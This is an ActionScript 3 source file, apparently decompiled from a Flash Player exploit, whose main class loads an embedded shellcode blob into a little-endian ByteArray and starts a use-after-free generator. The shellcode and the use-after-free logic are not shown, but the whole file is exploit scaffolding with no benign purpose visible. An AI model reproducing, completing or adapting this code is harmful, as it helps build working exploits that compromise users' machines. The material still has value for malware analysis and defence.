package
{
   import flash.display.Sprite;
   import flash.utils.ByteArray;
   import flash.utils.Endian;
   
   public class MainExp extends Sprite
   {
      
      public static var var_1:Class = shellcodBytes;
      
      public static var data14:ByteArray;
       
      
      private var var_3:UAFGenerator;
      
      public function MainExp()
      {
         super();
         data14 = new var_1() as ByteArray;
         data14.endian = Endian.LITTLE_ENDIAN;
         this.var_3 = new UAFGenerator(this);
      }
      
      public function flash21() : void
      {
      }
   }
}
